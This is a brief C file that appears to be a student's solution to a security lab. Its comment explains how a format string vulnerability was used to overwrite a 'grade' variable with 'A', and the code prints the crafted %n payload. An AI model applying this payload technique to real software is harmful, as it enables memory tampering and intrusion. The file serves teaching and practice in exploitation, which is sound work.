#include <stdio.h>
#include <string.h>
//Sophia Spaner, Vpq5kd
//Though I did a lot more in the interim to truly understand how this code works, there were essentially three phases I went through to come to my solution. First, I needed to determine the address of the variable that I had to change. using objdump, bless (a program for examining hex), gdb, and lldb, I realized that the memory address of the "grade" variable was 0x0804a02a. Next, I exploited the format string vulnerability in the "vulnerable" function of the executable to read the stack. Essentially, I made an ultra long attackString of "0x0804a02a+ "%x" until I located the place in the stack where the address I had put in ended up. Lastly, I counted the amount of %x's it took and used that as a modifier of the %n format. To actually get the letter right, I had to count out exactly 65 characters using spaces to load the number 65 (0x41 = 'A') into memory at the address I wanted. 
char attackString[] = "\x2a\xa0\x04\x08                                                             %23$n\nsophie\n\n"; 
int main(){
	char *p = attackString;
	for(int i = 0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
		
	}
	return 0;
}
